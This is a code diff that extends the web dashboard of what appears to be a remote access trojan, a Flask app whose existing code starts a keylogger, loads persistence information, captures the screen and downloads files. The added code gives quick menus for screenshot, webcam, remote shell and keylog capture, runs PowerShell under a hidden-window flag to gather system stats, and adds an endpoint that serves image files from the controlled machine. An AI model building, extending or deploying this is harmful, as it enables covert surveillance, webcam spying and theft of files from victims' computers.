@@ -2110,6 +2110,112 @@ DASHBOARD_HTML = r'''
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: #0a0a0a; }
         ::-webkit-scrollbar-thumb { background: rgba(124, 58, 237, 0.2); border-radius: 3px; }
+
+        /* Status Bar */
+        .status-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #0a0a0f; border-top: 1px solid rgba(124, 58, 237, 0.15);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 4px 16px; font-size: 10px; color: #555; z-index: 900;
+        }
+        .status-bar-section { display: flex; align-items: center; gap: 16px; }
+        .status-bar-item { display: flex; align-items: center; gap: 4px; }
+        .status-bar-dot { width: 5px; height: 5px; border-radius: 50%; }
+        .status-bar-dot.green { background: #44ff88; }
+        .status-bar-dot.red { background: #ef4444; }
+        .status-bar-dot.purple { background: #7c3aed; }
+
+        /* FAB (Mobile) */
+        .fab {
+            display: none; position: fixed; bottom: 70px; right: 16px;
+            width: 52px; height: 52px; border-radius: 50%;
+            background: #7c3aed; color: #000; border: none;
+            font-size: 22px; font-weight: bold; cursor: pointer;
+            z-index: 999; box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
+        }
+        .fab-menu {
+            display: none; position: fixed; bottom: 130px; right: 16px;
+            background: #0f0a1a; border: 1px solid rgba(124, 58, 237, 0.3);
+            border-radius: 8px; padding: 8px; z-index: 999;
+            flex-direction: column; gap: 4px;
+        }
+        .fab-menu.open { display: flex; }
+        .fab-menu button {
+            background: transparent; color: #c084fc; border: none;
+            padding: 10px 16px; text-align: left; cursor: pointer;
+            font-family: 'Courier New', monospace; font-size: 12px;
+            border-radius: 4px;
+        }
+        .fab-menu button:hover { background: rgba(124, 58, 237, 0.15); }
+
+        /* Blinking Cursor */
+        .log-box::after { content: '_'; animation: blink 1s step-end infinite; color: #7c3aed; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+        /* Color-coded log entries */
+        .log-entry { line-height: 1.6; }
+        .log-entry.error { color: #ef4444; }
+        .log-entry.success { color: #44ff88; }
+        .log-entry.info { color: #7c3aed; }
+        .log-entry.warn { color: #f59e0b; }
+
+        /* Context Menu */
+        .ctx-menu {
+            display: none; position: fixed;
+            background: #0f0a1a; border: 1px solid rgba(124, 58, 237, 0.3);
+            border-radius: 6px; padding: 4px; z-index: 10000;
+            min-width: 160px;
+        }
+        .ctx-menu.open { display: block; }
+        .ctx-menu button {
+            display: block; width: 100%; background: transparent;
+            color: #c084fc; border: none; padding: 8px 12px;
+            text-align: left; cursor: pointer; font-family: 'Courier New', monospace;
+            font-size: 12px; border-radius: 3px;
+        }
+        .ctx-menu button:hover { background: rgba(124, 58, 237, 0.15); color: #fff; }
+
+        /* Theme: Red mode */
+        body.red-mode { background: #0a0505; }
+        body.red-mode .sidebar { background: #0a0505; border-right-color: rgba(239, 68, 68, 0.15); }
+        body.red-mode .section { background: #1a0808; border-color: rgba(239, 68, 68, 0.15); }
+        body.red-mode .log-box { background: #050303; border-color: rgba(239, 68, 68, 0.1); }
+        body.red-mode .nav-item:hover { background: rgba(239, 68, 68, 0.06); border-left-color: #ef4444; }
+        body.red-mode .nav-item.active { background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444; color: #ef4444; }
+        body.red-mode .nav-icon { color: #ef4444; }
+        body.red-mode .sidebar-logo { color: #ef4444; text-shadow: 0 0 10px rgba(239, 68, 68, 0.3); }
+        body.red-mode .section-title { color: #ef4444; }
+        body.red-mode .btn { color: #ef4444; border-color: rgba(239, 68, 68, 0.3); }
+        body.red-mode .btn:hover { background: rgba(239, 68, 68, 0.12); border-color: #ef4444; box-shadow: 0 0 10px rgba(239, 68, 68, 0.15); }
+        body.red-mode .btn.active { background: #ef4444; color: #000; }
+        body.red-mode .info-value { color: #ef4444; }
+        body.red-mode .login-title { color: #ef4444; text-shadow: 0 0 12px rgba(239, 68, 68, 0.4); }
+        body.red-mode .login-box { border-color: rgba(239, 68, 68, 0.3); }
+        body.red-mode .status-bar { border-top-color: rgba(239, 68, 68, 0.15); }
+        body.red-mode .fab { background: #ef4444; box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4); }
+        body.red-mode .log-box::after { color: #ef4444; }
+        body.red-mode .stream-badge { background: #ef4444; }
+        body.red-mode .status-bar-dot.purple { background: #ef4444; }
+
+        /* Image thumbnails in file browser */
+        .file-thumb {
+            width: 32px; height: 32px; object-fit: cover;
+            border-radius: 3px; border: 1px solid rgba(124, 58, 237, 0.2);
+            display: none;
+        }
+        .file-item.is-image .file-thumb { display: block; }
+        .file-item.is-image .file-icon { display: none; }
+
+        /* Mobile overrides for new elements */
+        @media (max-width: 768px) {
+            .fab { display: flex; align-items: center; justify-content: center; }
+            .status-bar { padding: 3px 10px; font-size: 9px; bottom: 54px; }
+            .main-content { padding-bottom: 80px; }
+        }
+        @media (max-width: 480px) {
+            .status-bar { bottom: 48px; }
+            .main-content { padding-bottom: 72px; }
+        }
     </style>
 </head>
 <body>
@@ -2598,17 +2704,91 @@ DASHBOARD_HTML = r'''
         let monitorCount = 0;
 
         // Logging
-        function logActivity(msg) {
+        function logActivity(msg, type) {
             const log = document.getElementById('activityLog');
             const time = new Date().toLocaleTimeString('en-US', {hour12: false});
-            log.textContent += `[${time}] ${msg}
-`;
+            const cls = type || 'info';
+            const span = document.createElement('div');
+            span.className = 'log-entry ' + cls;
+            span.textContent = `[${time}] ${msg}`;
+            log.appendChild(span);
             log.scrollTop = log.scrollHeight;
         }
         function clearActivity() { document.getElementById('activityLog').textContent = ''; }
 
+        // Theme Toggle
+        function toggleTheme() {
+            document.body.classList.toggle('red-mode');
+            const isRed = document.body.classList.contains('red-mode');
+            localStorage.setItem('igr-theme', isRed ? 'red' : 'purple');
+            logActivity('Theme: ' + (isRed ? 'Red Mode' : 'Purple Mode'), 'info');
+        }
+        function loadTheme() {
+            if (localStorage.getItem('igr-theme') === 'red') document.body.classList.add('red-mode');
+        }
+
+        // FAB
+        function toggleFab() {
+            document.getElementById('fabMenu').classList.toggle('open');
+        }
+        function closeFab() {
+            document.getElementById('fabMenu').classList.remove('open');
+        }
+
+        // Context Menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            const menu = document.getElementById('ctxMenu');
+            menu.style.left = e.clientX + 'px';
+            menu.style.top = e.clientY + 'px';
+            menu.classList.add('open');
+        });
+        document.addEventListener('click', function() {
+            document.getElementById('ctxMenu').classList.remove('open');
+        });
+        function ctxAction(action) {
+            document.getElementById('ctxMenu').classList.remove('open');
+            if (action === 'screenshot') captureScreen();
+            else if (action === 'webcam') captureWebcam();
+            else if (action === 'shell') showPage('shell');
+            else if (action === 'theme') toggleTheme();
+            else if (action === 'refresh') location.reload();
+        }
+
+        // Live Status Bar
+        function updateStatusBar() {
+            fetch('/api/system/info').then(r=>r.json()).then(data=>{
+                if (data.cpu_percent !== undefined) document.getElementById('sbCpu').textContent = 'CPU: ' + data.cpu_percent + '%';
+                if (data.ram_percent !== undefined) document.getElementById('sbRam').textContent = 'RAM: ' + data.ram_percent + '%';
+                if (data.disk_percent !== undefined) document.getElementById('sbDisk').textContent = 'Disk: ' + data.disk_percent + '%';
+            }).catch(()=>{});
+            const m = Math.floor((Date.now() - _startTime) / 60000);
+            document.getElementById('sbUptime').textContent = 'Uptime: ' + m + 'm';
+        }
+        setInterval(updateStatusBar, 5000);
+
+        // Typing Effect for command output
+        function typeOutput(elementId, text, speed) {
+            const el = document.getElementById(elementId);
+            if (!el) return;
+            el.textContent = '';
+            let i = 0;
+            speed = speed || 5;
+            function type() {
+                if (i < text.length) {
+                    el.textContent += text.charAt(i);
+                    i++;
+                    const chunk = Math.min(speed, text.length - i);
+                    for (let c = 0; c < chunk; c++) { el.textContent += text.charAt(i); i++; }
+                    el.scrollTop = el.scrollHeight;
+                    requestAnimationFrame(type);
+                }
+            }
+            type();
+        }
+
         // Init
-        function initApp() { loadNetworkInfo(); checkHardware(); getSystemInfo(); startKeylogger(); detectMonitors(); loadPersistenceInfo(); }
+        function initApp() { loadNetworkInfo(); checkHardware(); getSystemInfo(); startKeylogger(); detectMonitors(); loadPersistenceInfo(); loadTheme(); updateStatusBar(); }
 
         // Network Info
         async function loadNetworkInfo() {
@@ -2861,8 +3041,16 @@ DASHBOARD_HTML = r'''
             (data.files || []).forEach(file => {
                 const item = document.createElement('div');
                 item.className = 'file-item';
-                item.innerHTML = `<span class="file-icon">${file.endsWith('/') || file.endsWith('\\\\') ? '[D]' : '[F]'}</span>${file}`;
-                item.onclick = () => { document.getElementById('filePath').value = path.endsWith('\\\\') ? path + file : path + '\\\\' + file; };
+                const isDir = file.endsWith('/') || file.endsWith('\\');
+                const isImage = /\.(jpg|jpeg|png|gif|bmp|webp|ico|svg)$/i.test(file);
+                if (isImage) {
+                    item.classList.add('is-image');
+                    const fullPath = path.endsWith('\\') ? path + file : path + '\\' + file;
+                    item.innerHTML = `<img class="file-thumb" src="/api/files/preview?path=${encodeURIComponent(fullPath)}" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';"><span class="file-icon" style="display:none;">[F]</span>${file}`;
+                } else {
+                    item.innerHTML = `<span class="file-icon">${isDir ? '[D]' : '[F]'}</span>${file}`;
+                }
+                item.onclick = () => { document.getElementById('filePath').value = path.endsWith('\\') ? path + file : path + '\\' + file; };
                 list.appendChild(item);
             });
             logActivity('Listed files');
@@ -3375,6 +3563,39 @@ DASHBOARD_HTML = r'''
             listProcesses();
         }
     </script>
+
+    <!-- Status Bar -->
+    <div class="status-bar" id="statusBar">
+        <div class="status-bar-section">
+            <div class="status-bar-item"><div class="status-bar-dot green"></div><span id="sbConnection">Connected</span></div>
+            <div class="status-bar-item"><div class="status-bar-dot purple"></div><span id="sbCpu">CPU: --</span></div>
+            <div class="status-bar-item"><div class="status-bar-dot purple"></div><span id="sbRam">RAM: --</span></div>
+            <div class="status-bar-item"><div class="status-bar-dot purple"></div><span id="sbDisk">Disk: --</span></div>
+        </div>
+        <div class="status-bar-section">
+            <span id="sbUptime">Uptime: 0m</span>
+            <button onclick="toggleTheme()" style="background:none;border:none;color:#555;cursor:pointer;font-family:monospace;font-size:10px;">[THEME]</button>
+        </div>
+    </div>
+
+    <!-- FAB (Mobile) -->
+    <button class="fab" id="fabBtn" onclick="toggleFab()">+</button>
+    <div class="fab-menu" id="fabMenu">
+        <button onclick="captureScreen();closeFab()">Screenshot</button>
+        <button onclick="captureWebcam();closeFab()">Webcam</button>
+        <button onclick="showPage('shell');closeFab()">Shell</button>
+        <button onclick="showPage('keylogger');closeFab()">Keylog</button>
+        <button onclick="toggleTheme();closeFab()">Theme</button>
+    </div>
+
+    <!-- Context Menu -->
+    <div class="ctx-menu" id="ctxMenu">
+        <button onclick="ctxAction('screenshot')">Screenshot</button>
+        <button onclick="ctxAction('webcam')">Webcam</button>
+        <button onclick="ctxAction('shell')">Shell</button>
+        <button onclick="ctxAction('theme')">Toggle Theme</button>
+        <button onclick="ctxAction('refresh')">Refresh Page</button>
+    </div>
 </body>
 </html>
 '''
@@ -4070,7 +4291,7 @@ def screen_capture():
 
 @app.route('/api/system/info')
 def system_info():
-    """Get system information."""
+    """Get system information including CPU/RAM/Disk usage."""
     try:
         import platform
         info = {
@@ -4081,6 +4302,28 @@ def system_info():
             'machine': platform.machine(),
             'processor': platform.processor()
         }
+        try:
+            import psutil
+            info['cpu_percent'] = psutil.cpu_percent(interval=0.5)
+            mem = psutil.virtual_memory()
+            info['ram_percent'] = round(mem.percent)
+            disk = psutil.disk_usage('C:\\')
+            info['disk_percent'] = round(disk.percent)
+        except:
+            try:
+                result = subprocess.run(['powershell', '-Command',
+                    '$cpu = (Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average; ' +
+                    '$os = Get-WmiObject Win32_OperatingSystem; $ram = [math]::Round(($os.FreePhysicalMemory/$os.TotalVisibleMemorySize)*100); ' +
+                    '$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID=\'C:\'"; $dpct = [math]::Round(($disk.FreeSpace/$disk.Size)*100); ' +
+                    "Write-Output \"$cpu|$ram|$dpct\""],
+                    capture_output=True, text=True, timeout=10, creationflags=0x08000000)
+                parts = result.stdout.strip().split('|')
+                if len(parts) == 3:
+                    info['cpu_percent'] = int(parts[0]) if parts[0] != '' else 0
+                    info['ram_percent'] = 100 - int(parts[1])
+                    info['disk_percent'] = 100 - int(parts[2])
+            except:
+                pass
         return jsonify(info)
     except:
         return jsonify({})
@@ -4097,6 +4340,19 @@ def list_files():
         return jsonify({'files': []})
     except:
         return jsonify({'files': []})
+
+@app.route('/api/files/preview')
+def preview_file():
+    """Serve image file for thumbnail preview."""
+    try:
+        path = request.args.get('path', '')
+        if os.path.exists(path) and os.path.isfile(path):
+            ext = os.path.splitext(path)[1].lower()
+            if ext in ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.ico', '.svg'):
+                return send_file(path)
+        return Response('', mimetype='image/png')
+    except:
+        return Response('', mimetype='image/png')
 
 @app.route('/api/files/download')
 def download_file():
